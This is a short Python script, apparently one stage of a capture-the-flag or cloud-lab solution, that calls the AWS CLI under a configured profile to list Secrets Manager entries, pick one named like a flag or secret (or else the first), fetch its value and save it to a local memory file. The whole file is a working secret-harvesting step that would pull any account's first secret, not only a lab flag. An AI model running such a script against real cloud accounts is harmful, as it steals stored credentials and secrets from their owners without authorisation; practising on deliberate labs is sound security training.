# file: 05_get_secrets.py
import json
import re
import subprocess
from shared.helpers import State

FLAG_REGEX = re.compile(r"\{[^{}]*\}")  # grabs {...}

def run_cli(args, profile):
    cmd = ["aws"] + args + ["--profile", profile]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise SystemExit(f"CLI error for {' '.join(cmd)}\n{r.stderr}")
    return r.stdout

def main():
    cfg = State.load_cfg()
    mem = State.load_mem()

    profile = cfg['profile']

    print("[+] Listing secrets…")
    out = run_cli(["secretsmanager", "list-secrets"], profile)
    data = json.loads(out)
    secrets = data.get('SecretList', [])
    if not secrets:
        raise SystemExit("No secrets found.")

    # Prefer a secret that looks like a flag
    secret = None
    for s in secrets:
        name = s.get('Name', '')
        if 'flag' in name.lower() or 'secret' in name.lower():
            secret = s
            break
    if not secret:
        secret = secrets[0]

    sid = secret['ARN'] if 'ARN' in secret else secret['Name']
    print(f"[+] Fetching secret: {sid}")

    out = run_cli(["secretsmanager", "get-secret-value", "--secret-id", sid], profile)
    val = json.loads(out).get('SecretString') or ""

    # Try to extract a {FLAG} token
    m = FLAG_REGEX.search(val)
    flag = m.group(0) if m else val.strip()

    mem.update({'secret_id': sid, 'secret_value': val, 'flag': flag})
    State.save_mem(mem)

    print("[+] Secret value saved to shared/memory.json under 'secret_value' and 'flag'")
    print(f"[FLAG] {flag}")

if __name__ == '__main__':
    main()